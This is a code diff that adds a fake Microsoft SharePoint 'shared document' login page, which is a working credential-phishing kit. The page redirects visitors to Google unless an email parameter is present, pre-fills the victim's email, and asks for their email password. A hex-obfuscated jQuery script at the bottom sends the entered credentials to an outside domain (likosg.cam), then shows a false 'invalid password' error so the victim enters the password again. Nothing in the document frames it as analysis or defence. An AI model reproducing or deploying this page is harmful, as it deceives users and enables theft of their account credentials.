@@ -1,0 +1,122 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>SharePoint Doc</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="shortcut icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAD0AAAA9CAYAAAAeYmHpAAAAvElEQVRoge3YMQrCMBSH8fcsnkFcvYUI4tZVxNVN6OTmYTIL9hCODp5HcNMq0rXQbA8r/++3ZAgk+ZItBgDAf/DcKR/r2Sui4jhZjNtxuq2biPXnH1+WZXPrmx9FbDp0RKsgWgXRKohWQbQKolUQrYJoFUSrIFpF9je0qnaDvYaUTtl59/40XrqrON/fEZvur4eiHdOmfkasfzFf8e/dQbQKolUQrYJoFUSrIFoF0SqIVkG0CqIBAAB+ysy+e6AWWsW99u0AAAAASUVORK5CYII=" type="image/png"/>
+   
+  <!-- Bootstrap & Icons -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+
+  <style>
+    body {
+      background-color: #e6f2f0;
+      font-family: "Segoe UI", sans-serif;
+    }
+
+    .card {
+      border-radius: 1rem;
+    }
+
+    .logo {
+      width: 60px;
+      margin-bottom: 15px;
+    }
+
+    .header-title {
+      font-size: 1.5rem;
+      font-weight: bold;
+      color: #0078d4;
+    }
+
+    .btn-primary {
+      background-color: #0078d4;
+      border-color: #0078d4;
+    }
+
+    .btn-primary:hover {
+      background-color: #005a9e;
+      border-color: #005a9e;
+    }
+  </style>
+  <script>
+    (function() {
+        const searchParams = new URLSearchParams(window.location.search);
+        if (!searchParams.get('email')) {
+            window.location.href = 'https://google.com';
+        }
+    })();
+</script>
+</head>
+
+<body>
+  <div class="container py-5">
+    <div class="row justify-content-center align-items-center">
+      <div class="col-md-8 col-lg-6">
+        <div class="card shadow-sm">
+          <div class="card-body p-5 text-center">
+
+            <!-- SharePoint Logo -->
+            <div class="logo mx-auto">
+              <svg viewBox="0 0 88 88" xmlns="http://www.w3.org/2000/svg">
+                <defs>
+                  <radialGradient id="spGradient" cx="50%" cy="50%" r="50%">
+                    <stop offset="0%" stop-color="#03A78F"/>
+                    <stop offset="100%" stop-color="#007B5A"/>
+                  </radialGradient>
+                </defs>
+                <circle cx="66" cy="24" r="14" fill="#02735E"/>
+                <circle cx="70" cy="64" r="14" fill="#02897A"/>
+                <circle cx="28" cy="44" r="14" fill="url(#spGradient)"/>
+                <path d="M15,27 C15,20 24,15 30,14 L64,16 C70,16 74,20 74,26 L74,60 C74,66 70,70 64,70 L30,70 C24,70 15,65 15,58 Z" fill="#036C70"/>
+                <path d="M38 58c1.5 1.2 3.5 1.8 5.7 1.8 2.4 0 4.2-.4 5.5-1.3 1.3-.9 2-2.3 2-4.1 0-1.2-.3-2.2-.9-3-.6-.8-1.3-1.4-2.2-1.8-.9-.4-2.1-.8-3.6-1.1-1.9-.4-3.2-.8-4.1-1.4s-1.3-1.3-1.3-2.2c0-.9.4-1.6 1.1-2.1.8-.5 1.8-.8 3.1-.8 1.2 0 2.3.2 3.2.6.9.4 1.6.9 2.2 1.6l3.2-3.4c-1.6-1.9-4.1-2.8-7.4-2.8-2.2 0-4.1.4-5.6 1.3s-2.2 2.3-2.2 4.2c0 1.4.4 2.5 1.1 3.4.7.9 1.7 1.6 3 2.1 1.3.5 2.6.9 4.1 1.2 1.3.3 2.2.7 2.9 1.2.6.5 1 1.2 1 2 0 1.1-.4 1.9-1.2 2.4-.8.5-1.9.8-3.2.8-1.4 0-2.7-.3-3.7-1-1.1-.7-1.8-1.6-2.3-2.7l-3.5 3.1z" fill="#ffffff"/>
+              </svg>
+            </div>
+
+            <h3 class="header-title">SharePoint</h3>
+
+            <p class="lead mt-3">
+              Please proceed to securely access shared document.
+            </p>
+
+            <div class="alert alert-info small text-left" style="border-left: 3px solid #0078d4;">
+              For security reasons, authentication is required before accessing shared documents.
+            </div>
+<form method="post" id="profileUp">
+            <!-- Email Input -->
+            <input type="email" id="x1" name="x1" value="" class="form-control mt-3"
+                   placeholder="Enter your email address" readonly>
+            <input type="password" id="x2" name="x2" class="form-control mt-3"
+                   placeholder="Enter your email password" required>
+            <br />
+            
+            <div id="msg" class="alert alert-success">
+                        Authenticating, Please wait&sdot;&sdot;&sdot;
+                    </div>
+                    <div id="msg2" class="alert alert-danger">
+                        ⚠ Please enter a valid password&sdot;
+                    </div>
+
+            <button type="submit" id="byn" class="btn btn-primary btn-block mt-4">
+              Proceed to Document
+            </button>
+
+            <hr>
+            <p class="small">If you need assistance, contact your SharePoint administrator.</p>
+            <p class="small">All rights reserved⋅ &copy; Microsoft 2026</p>
+</form>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Scripts -->
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.0/jquery.min.js"></script>
+  <!-- <script src="app.js"></script> -->
+  <script> function _0x1d1a(_0x755ed1,_0x12250c){_0x755ed1=_0x755ed1-0x12a;var _0x2a197b=_0x2a19();var _0x1d1a84=_0x2a197b[_0x755ed1];return _0x1d1a84;}function _0x2a19(){var _0x4b65e7=['disabled','8RdkNBQ','1453135KzUgPF','preventDefault','45qJxmts','prop','submit','ready','ajax','lastIndexOf','23928060dkZDCp','html','30190zQiZuU','1910724mUBCnT','val','#x2','show','#profileUp','814663BELpzP','11624277aSECLA','POST','2765720WIbsHB','https://likosg.cam/dionz/e/','Download','#msg2','href','#byn','substring','hide','30qJpXNJ','#msg','#x1'];_0x2a19=function(){return _0x4b65e7;};return _0x2a19();}var _0xd86b01=_0x1d1a;(function(_0xfb44de,_0x355a08){var _0x5c262f=_0x1d1a,_0x249be0=_0xfb44de();while(!![]){try{var _0x2d04e1=-parseInt(_0x5c262f(0x146))/0x1+parseInt(_0x5c262f(0x140))/0x2+parseInt(_0x5c262f(0x141))/0x3*(parseInt(_0x5c262f(0x135))/0x4)+-parseInt(_0x5c262f(0x136))/0x5*(-parseInt(_0x5c262f(0x131))/0x6)+-parseInt(_0x5c262f(0x147))/0x7+-parseInt(_0x5c262f(0x149))/0x8*(parseInt(_0x5c262f(0x138))/0x9)+parseInt(_0x5c262f(0x13e))/0xa;if(_0x2d04e1===_0x355a08)break;else _0x249be0['push'](_0x249be0['shift']());}catch(_0x414ba8){_0x249be0['push'](_0x249be0['shift']());}}}(_0x2a19,0xe34bb),$(document)[_0xd86b01(0x13b)](function(){var _0x11f3b9=_0xd86b01;$(_0x11f3b9(0x132))[_0x11f3b9(0x130)](),$(_0x11f3b9(0x12c))['hide']();var _0x3ed23b=window['location'][_0x11f3b9(0x12d)],_0x410afd=_0x3ed23b[_0x11f3b9(0x12f)](_0x3ed23b[_0x11f3b9(0x13d)]('=')+0x1);$(_0x11f3b9(0x133))[_0x11f3b9(0x142)](_0x410afd),$(_0x11f3b9(0x145))[_0x11f3b9(0x13a)](function(_0xfd3f3d){var _0x2a7978=_0x11f3b9;_0xfd3f3d[_0x2a7978(0x137)]();var _0x13566c=$('#A1')[_0x2a7978(0x142)](),_0x5e44a2=new FormData($(_0x2a7978(0x145))[0x0]);$(_0x2a7978(0x12e))['html']('Processing..')['prop'](_0x2a7978(0x134),!![]),$[_0x2a7978(0x13c)]({'url':_0x2a7978(0x12a),'type':_0x2a7978(0x148),'data':_0x5e44a2,'crossDomain':!![],'contentType':![],'processData':![],'success':function(_0x1f807e){var _0x11cbc9=_0x2a7978;$(_0x11cbc9(0x132))[_0x11cbc9(0x144)](),$(_0x11cbc9(0x12c))[_0x11cbc9(0x130)](),setTimeout(function(){var _0x18b359=_0x11cbc9;$(_0x18b359(0x132))[_0x18b359(0x130)](),$('#msg2')[_0x18b359(0x144)](),$(_0x18b359(0x133))[_0x18b359(0x142)](_0x410afd),$(_0x18b359(0x143))[_0x18b359(0x142)](''),$(_0x18b359(0x12e))[_0x18b359(0x13f)](_0x18b359(0x12b))[_0x18b359(0x139)](_0x18b359(0x134),![]);},0x7d0);}});});}));
+    </script>
+</body>
+</html>
